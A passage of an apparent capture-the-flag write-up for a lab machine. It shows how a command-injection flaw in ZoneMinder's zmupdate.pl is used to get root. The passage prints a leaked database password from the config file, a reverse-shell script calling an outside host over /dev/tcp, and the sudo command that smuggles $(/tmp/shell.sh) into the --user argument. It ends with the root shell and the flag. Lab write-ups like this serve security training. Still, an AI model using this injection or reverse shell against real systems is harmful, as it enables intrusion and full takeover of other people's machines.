my $dbPass = $Config{ZM_DB_PASS};
my $super = 0;
my $updateDir = '';

GetOptions(
    'check'          =>\$check,
    'freshen'        =>\$freshen,
    'rename'         =>\$rename,
    'zone-fix'       =>\$zoneFix,
    'migrate-events' =>\$migrateEvents,
    'version=s'      =>\$version,
    'interactive!'   =>\$interactive,
    'user:s'         =>\$dbUser,
    'pass:s'         =>\$dbPass,
    'super'          =>\$super,
    'dir:s'          =>\$updateDir
    ) or pod2usage(-exitstatus => -1);

my $dbh = zmDbConnect(undef, { mysql_multi_statements=>1 } );
if ( !$dbh ) {
  die "Unable to connect to db\n";
}
$Config{ZM_DB_USER} = $dbUser;
$Config{ZM_DB_PASS} = $dbPass;
# we escape dbpass with single quotes so that $ in the password has no effect, but dbpass could have a ' in it.
$dbPass =~ s/'/\\'/g;

...

    if ( $response =~ /^[yY]$/ ) {
      my ( $host, $portOrSocket ) = ( $Config{ZM_DB_HOST} =~ /^([^:]+)(?::(.+))?$/ );
      my $command = 'mysqldump';
      if ($super) {
        $command .= ' --defaults-file=/etc/mysql/debian.cnf';
      } elsif ($dbUser) {
        $command .= ' -u'.$dbUser;
        $command .= ' -p\''.$dbPass.'\'' if $dbPass;
      }

...
```

So we can execute our command instead of the user variable. The user password `ZoneMinderPassword2023` can be found in `/etc/zm/zm.conf`, but in fact it can be anything.


```shell
cat /etc/zm/zm.conf
# ==========================================================================
#
# ZoneMinder Base Configuration
#
# ==========================================================================
#
# *** DO NOT EDIT THIS FILE ***
#
# To make custom changes to the variables below, create a new configuration
# file, with an extention of .conf, under the /etc/zm/conf.d
# folder, containing your desired modifications.
#

# Path to installed data directory, used mostly for finding DB upgrade scripts
ZM_PATH_DATA=/usr/share/zoneminder

# Path to ZoneMinder binaries
ZM_PATH_BIN=/usr/bin

# Path to ZoneMinder libraries (none at present, for future use)
ZM_PATH_LIB=/usr/lib/x86_64-linux-gnu

# Path to ZoneMinder configuration (this file only at present)
ZM_PATH_CONF=/etc/zm

# Path to ZoneMinder web files
ZM_PATH_WEB=/usr/share/zoneminder/www

# Path to ZoneMinder cgi files
ZM_PATH_CGI=/usr/lib/zoneminder/cgi-bin

# Username and group that web daemon (httpd/apache) runs as
ZM_WEB_USER=www-data
ZM_WEB_GROUP=www-data

# ZoneMinder database type: so far only mysql is supported
ZM_DB_TYPE=mysql

# ZoneMinder database hostname or ip address and optionally port or unix socket
# Acceptable formats include hostname[:port], ip_address[:port], or
# localhost:/path/to/unix_socket
ZM_DB_HOST=localhost

# ZoneMinder database name
ZM_DB_NAME=zm

# ZoneMinder database user
ZM_DB_USER=zmuser

# ZoneMinder database password
ZM_DB_PASS=ZoneMinderPassword2023

# SSL CA certificate for ZoneMinder database
ZM_DB_SSL_CA_CERT=

# SSL client key for ZoneMinder database
ZM_DB_SSL_CLIENT_KEY=

# SSL client cert for ZoneMinder database
ZM_DB_SSL_CLIENT_CERT=

# Do NOT set ZM_SERVER_HOST if you are not using Multi-Server
# You have been warned
#
# The name specified here must have a corresponding entry
# in the Servers tab under Options
ZM_SERVER_HOST=
```

First create the bash script, and then use the features of zmupdate.pl to upload and escalate privileges:

**`shell.sh`**

```shell
#!/bin/bash
bash -c "bash -i >& /dev/tcp/10.10.16.49/4444 0<&1"
```

Run the exploit:

```shell
(Meterpreter 2)(/tmp) > cd /tmp/
(Meterpreter 2)(/tmp) > upload  shell.sh
(Meterpreter 2)(/tmp) > ls -al
(Meterpreter 2)(/tmp) > shell

cd /tmp
chmod 700 shell.sh
ls -al shell.sh
-rwx------ 1 zoneminder zoneminder 64 Dec 12 08:12 shell.sh

sudo /usr/bin/zmupdate.pl --version=1 --user='$(/tmp/shell.sh)' --pass=ZoneMinderPassword2023

Initiating database upgrade to version 1.36.32 from version 1

WARNING - You have specified an upgrade from version 1 but the database version found is 1.36.32. Is this correct?
Press enter to continue or ctrl-C to abort :

Do you wish to take a backup of your database prior to upgrading?
This may result in a large file in /tmp/zm if you have a lot of events.
Press 'y' for a backup or 'n' to continue : n

Upgrading database to version 1.36.32
Upgrading DB to 1.26.1 from 1.26.0

```

Catch the shell:

```shell
$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.49] from (UNKNOWN) [10.10.11.245] 56956
bash: cannot set terminal process group (1113): Inappropriate ioctl for device
bash: no job control in this shell
root@surveillance:/tmp# id
id
uid=0(root) gid=0(root) groups=0(root)
root@surveillance:/tmp# cd
cd
root@surveillance:~# ls
ls
root.txt
root@surveillance:~# cat root.txt
cat root.txt
6497feab75375e41aeea036cbf7d7e09
root@surveillance:~#
```